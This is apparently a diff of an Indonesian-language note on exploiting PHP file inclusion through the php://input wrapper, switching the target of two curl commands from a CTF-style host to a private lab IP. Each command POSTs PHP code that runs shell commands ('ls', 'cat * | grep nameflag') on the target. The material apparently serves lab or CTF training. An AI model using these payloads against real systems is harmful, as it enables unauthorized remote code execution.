@@ -12,8 +12,8 @@ http://192.168.183.128/fileincl/example1.php?page=php://input
 
 Payload Post data, coba sesuatu yang sederhana untuk memulai dengan seperti:
 
-curl -X POST --data "<?php system('ls'); ?>" http://not.codepwnda.id:30469/?page=php://input
-curl -X POST --data "<?php system('cat * | grep nameflag'); ?>" http://not.codepwnda.id:30469/?page=php://input
+curl -X POST --data "<?php system('ls'); ?>" http://192.168.183.128/fileincl/example1.php?page=php://input
+curl -X POST --data "<?php system('cat * | grep nameflag'); ?>" http://192.168.183.128/fileincl/example1.php?page=php://input
 
 
 =================================================================================================================
